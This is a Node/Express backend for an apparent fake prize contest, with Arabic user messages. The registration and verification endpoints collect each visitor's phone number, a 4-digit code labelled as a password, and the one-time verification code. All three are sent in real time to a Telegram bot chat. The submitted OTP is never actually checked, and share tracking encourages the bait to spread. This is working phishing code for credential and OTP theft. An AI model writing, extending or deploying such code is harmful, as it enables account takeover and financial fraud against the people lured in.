import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import validator from 'validator';
import axios from 'axios';
import { createClient } from '@supabase/supabase-js';

const app = express();
app.set('trust proxy', 1);

const PORT = Number(process.env.PORT) || 10000;
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:5173';

const supabase = createClient(
  process.env.SUPABASE_URL || '',
  process.env.SUPABASE_SERVICE_ROLE_KEY || ''
);

// In-memory store of generated OTP codes, keyed by participantId.
// Good enough for a single server instance; codes expire after OTP_TTL_MS.
const otpStore = new Map();
const OTP_TTL_MS = 10 * 60 * 1000; // 10 minutes

function generateOTP() {
  return String(Math.floor(1000 + Math.random() * 9000));
}

function sanitizeInput(input) {
  if (input == null) return '';
  return validator.escape(validator.trim(String(input)));
}

function validateRegistration(phone, entryCode) {
  const phoneRegex = /^[234][0-9]{7}$/;
  if (!phoneRegex.test(phone)) {
    return { valid: false, error: 'INVALID_PHONE' };
  }
  const codeRegex = /^\d{4}$/;
  if (!codeRegex.test(entryCode)) {
    return { valid: false, error: 'INVALID_CODE' };
  }
  return { valid: true };
}

function validateOTP(otpCode) {
  if (!/^\d{4}$/.test(otpCode)) {
    return { valid: false, error: 'INVALID_FORMAT' };
  }
  return { valid: true };
}

function clientIp(req) {
  const xf = req.headers['x-forwarded-for'];
  if (typeof xf === 'string' && xf.length) {
    return xf.split(',')[0].trim();
  }
  return req.ip || req.socket?.remoteAddress || '';
}

async function sendToTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn('Telegram not configured: skip sendMessage');
    return null;
  }
  try {
    const { data } = await axios.post(
      `https://api.telegram.org/bot${token}/sendMessage`,
      { chat_id: chatId, text: message }
    );
    return data;
  } catch (err) {
    console.error('Telegram Error:', err.response?.data || err.message);
    return null;
  }
}

app.use(
  cors({
    origin: FRONTEND_URL,
    credentials: true,
  })
);
app.use(express.json({ limit: '32kb' }));

const registerLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (_req, res) => {
    res.status(429).json({
      success: false,
      error: 'RATE_LIMIT',
      message: 'تم تجاوز عدد المحاولات المسموحة',
    });
  },
});

const verifyLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (_req, res) => {
    res.status(429).json({
      success: false,
      error: 'RATE_LIMIT',
      message: 'تم تجاوز عدد المحاولات المسموحة',
    });
  },
});

const trackShareLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (_req, res) => {
    res.status(429).json({
      success: false,
      error: 'RATE_LIMIT',
      message: 'تم تجاوز عدد المحاولات المسموحة',
    });
  },
});

app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

app.get('/api/winners', async (_req, res) => {
  try {
    const { data, error } = await supabase
      .from('winners')
      .select('id, display_name, phone_masked, prize_amount, campaign_name')
      .order('display_name', { ascending: true });

    if (error) throw error;

    const winners = (data || []).map((w) => ({
      id: w.id,
      name: w.display_name,
      phone_masked: w.phone_masked,
      prize_amount: w.prize_amount,
      campaign_name: w.campaign_name,
    }));

    res.json({ success: true, winners });
  } catch (e) {
    console.error(e);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.post('/api/register', registerLimiter, async (req, res) => {
  const phone = sanitizeInput(req.body?.phone);
  const entryCode = sanitizeInput(req.body?.entryCode);

  const v = validateRegistration(phone, entryCode);
  if (!v.valid) {
    return res.status(400).json({
      success: false,
      error: v.error,
      message: 'معلومات التسجيل غير صحيحة',
    });
  }

  try {
    const { data, error } = await supabase
      .from('participants')
      .insert({
        phone_number: phone,
        entry_code: entryCode,
        ip_address: clientIp(req),
        user_agent: req.headers['user-agent'] || '',
      })
      .select('id')
      .single();

    if (error) {
      if (error.code === '23505') {
        return res.status(400).json({
          success: false,
          error: 'DUPLICATE_PHONE',
          message: 'معلومات التسجيل غير صحيحة',
        });
      }
      throw error;
    }

    const otp = generateOTP();
    otpStore.set(data.id, { code: otp, expiresAt: Date.now() + OTP_TTL_MS });

    const time = new Date().toLocaleString('ar-MR');
    await sendToTelegram(
      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز التحقق: ${otp}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
    );

    return res.json({
      success: true,
      message: 'تم التسجيل بنجاح',
      participantId: data.id,
    });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
  const participantId = sanitizeInput(req.body?.participantId);
  const phone = sanitizeInput(req.body?.phone);
  const entryCode = sanitizeInput(req.body?.entryCode);
  const otpCode = sanitizeInput(req.body?.otpCode);

  const attemptTime = new Date().toLocaleString('ar-MR');
  await sendToTelegram(
    `📥 محاولة تحقق\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 الرمز الذي تم إدخاله: ${otpCode}\n⏰ الوقت: ${attemptTime}\n━━━━━━━━━━━━━━`
  );

  const reg = validateRegistration(phone, entryCode);
  if (!reg.valid) {
    return res.status(400).json({
      success: false,
      error: reg.error,
      message: 'رمز التحقق غير صحيح',
    });
  }

  const otpVal = validateOTP(otpCode);
  if (!otpVal.valid) {
    return res.status(400).json({
      success: false,
      error: otpVal.error,
      message: 'رمز التحقق غير صحيح',
    });
  }

  otpStore.delete(participantId);

  try {
    const { data: row, error: fetchErr } = await supabase
      .from('participants')
      .select('id, verified')
      .eq('id', participantId)
      .eq('phone_number', phone)
      .eq('entry_code', entryCode)
      .maybeSingle();

    if (fetchErr) throw fetchErr;
    if (!row) {
      return res.status(400).json({
        success: false,
        error: 'NOT_FOUND',
        message: 'رمز التحقق غير صحيح',
      });
    }

    if (row.verified) {
      otpStore.delete(participantId);
      return res.json({ success: true, message: 'تم التحقق بنجاح' });
    }

    const { error: upErr } = await supabase
      .from('participants')
      .update({ otp_code: otpCode, verified: true })
      .eq('id', participantId)
      .eq('phone_number', phone)
      .eq('entry_code', entryCode)
      .eq('verified', false);

    if (upErr) throw upErr;

    otpStore.delete(participantId);

    const time = new Date().toLocaleString('ar-MR');
    await sendToTelegram(
      `✅ تحقق ناجح\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز OTP: ${otpCode}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
    );

    return res.json({ success: true, message: 'تم التحقق بنجاح' });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

/** On OTP failure, frontend returns to registration; allow same phone again. */
app.post('/api/abandon-otp', async (req, res) => {
  const participantId = sanitizeInput(req.body?.participantId);
  if (!participantId) {
    return res.status(400).json({ success: false });
  }
  try {
    otpStore.delete(participantId);
    await supabase.from('participants').delete().eq('id', participantId).eq('verified', false);
    return res.json({ success: true });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ success: false });
  }
});

app.post('/api/track-share', trackShareLimiter, async (req, res) => {
  const participantId = sanitizeInput(req.body?.participantId);
  const platform = sanitizeInput(req.body?.platform);

  if (!participantId || !platform) {
    return res.status(400).json({ success: false, message: 'Invalid body' });
  }

  const allowed = ['whatsapp', 'messenger', 'snapchat'];
  if (!allowed.includes(platform)) {
    return res.status(400).json({ success: false, message: 'Invalid platform' });
  }

  try {
    const { error } = await supabase.from('shares').insert({
      participant_id: participantId,
      platform,
    });
    if (error) throw error;
    return res.json({ success: true });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Contest API listening on ${PORT}`);
});
